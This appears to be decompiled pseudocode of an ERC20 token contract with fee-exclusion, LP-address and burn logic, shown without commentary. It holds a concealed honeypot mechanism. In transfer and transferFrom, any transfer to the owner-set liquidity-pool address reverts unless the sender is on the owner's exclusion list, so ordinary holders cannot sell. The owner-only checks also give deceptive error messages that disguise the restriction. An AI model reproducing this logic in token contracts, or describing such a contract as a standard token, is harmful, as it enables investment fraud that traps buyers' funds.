contract main {




// =====================  Runtime code  =====================


mapping of uint256 balanceOf;
mapping of uint8 stor1;
uint256 sub_ed09743d;
address stor3;
address stor4;
address stor5;
mapping of uint256 allowance;
uint256 totalSupply;
address sub_8aee34b6Address;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function isExcludedFromFee(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor1[address(arg1)])
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function sub_8aee34b6(?) {
    return sub_8aee34b6Address
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function sub_ed09743d(?) {
    return sub_ed09743d
}

function _fallback() payable {
    revert
}

function includeInFee(address arg1) {
    require calldata.size - 4 >= 32
    if stor5 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
    stor1[address(arg1)] = 0
}

function excludeFromFee(address arg1) {
    require calldata.size - 4 >= 32
    if stor5 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
    stor1[address(arg1)] = 1
}

function lpSet(address arg1) {
    require calldata.size - 4 >= 32
    if stor5 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
    sub_8aee34b6Address = arg1
    return 1
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if arg2 > allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath: subtraction overflow'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if allowance[address(msg.sender)][address(arg1)] + arg2 < allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
    if arg2 == sub_8aee34b6Address:
        if not stor1[address(arg1)]:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: subtraction overflow'
    balanceOf[address(arg1)] -= arg3
    if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 'SafeMath: subtraction overflow'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
    if arg1 == sub_8aee34b6Address:
        if not stor1[address(msg.sender)]:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
    if totalSupply <= sub_ed09743d:
        if arg2 > balanceOf[address(msg.sender)]:
            revert with 0, 'SafeMath: subtraction overflow'
        balanceOf[address(msg.sender)] -= arg2
        if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
    else:
        if sub_8aee34b6Address == arg1:
            if 90 * arg2 / 100 > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] -= 90 * arg2 / 100
            if balanceOf[address(arg1)] + (90 * arg2 / 100) < balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] += 90 * arg2 / 100
            emit Transfer((90 * arg2 / 100), msg.sender, arg1);
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
            if not stor3:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
            if stor3 == sub_8aee34b6Address:
                if not stor1[address(msg.sender)]:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
            if 2 * arg2 / 100 > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] -= 2 * arg2 / 100
            if balanceOf[stor3] + (2 * arg2 / 100) < balanceOf[stor3]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor3] += 2 * arg2 / 100
            emit Transfer((2 * arg2 / 100), msg.sender, stor3);
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
            if not stor4:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
            if stor4 == sub_8aee34b6Address:
                if not stor1[address(msg.sender)]:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
            if arg2 / 100 > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] -= arg2 / 100
            if balanceOf[stor4] + (arg2 / 100) < balanceOf[stor4]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor4] += arg2 / 100
            emit Transfer((arg2 / 100), msg.sender, stor4);
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: burn from the zero address'
            if 7 * arg2 / 100 > totalSupply:
                revert with 0, 'SafeMath: subtraction overflow'
            totalSupply -= 7 * arg2 / 100
            if 7 * arg2 / 100 > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] -= 7 * arg2 / 100
            emit Transfer((7 * arg2 / 100), msg.sender, 0);
        else:
            if sub_8aee34b6Address != msg.sender:
                if arg2 > balanceOf[address(msg.sender)]:
                    revert with 0, 'SafeMath: subtraction overflow'
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
            else:
                if 90 * arg2 / 100 > balanceOf[address(msg.sender)]:
                    revert with 0, 'SafeMath: subtraction overflow'
                balanceOf[address(msg.sender)] -= 90 * arg2 / 100
                if balanceOf[address(arg1)] + (90 * arg2 / 100) < balanceOf[address(arg1)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg1)] += 90 * arg2 / 100
                emit Transfer((90 * arg2 / 100), msg.sender, arg1);
                if not msg.sender:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                if not stor3:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                if stor3 == sub_8aee34b6Address:
                    if not stor1[address(msg.sender)]:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                if 2 * arg2 / 100 > balanceOf[address(msg.sender)]:
                    revert with 0, 'SafeMath: subtraction overflow'
                balanceOf[address(msg.sender)] -= 2 * arg2 / 100
                if balanceOf[stor3] + (2 * arg2 / 100) < balanceOf[stor3]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor3] += 2 * arg2 / 100
                emit Transfer((2 * arg2 / 100), msg.sender, stor3);
                if not msg.sender:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                if not stor4:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                if stor4 == sub_8aee34b6Address:
                    if not stor1[address(msg.sender)]:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                if arg2 / 100 > balanceOf[address(msg.sender)]:
                    revert with 0, 'SafeMath: subtraction overflow'
                balanceOf[address(msg.sender)] -= arg2 / 100
                if balanceOf[stor4] + (arg2 / 100) < balanceOf[stor4]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor4] += arg2 / 100
                emit Transfer((arg2 / 100), msg.sender, stor4);
                if not msg.sender:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: burn from the zero address'
                if 7 * arg2 / 100 > totalSupply:
                    revert with 0, 'SafeMath: subtraction overflow'
                totalSupply -= 7 * arg2 / 100
                if 7 * arg2 / 100 > balanceOf[address(msg.sender)]:
                    revert with 0, 'SafeMath: subtraction overflow'
                balanceOf[address(msg.sender)] -= 7 * arg2 / 100
                emit Transfer((7 * arg2 / 100), msg.sender, 0);
    return 1
}



}
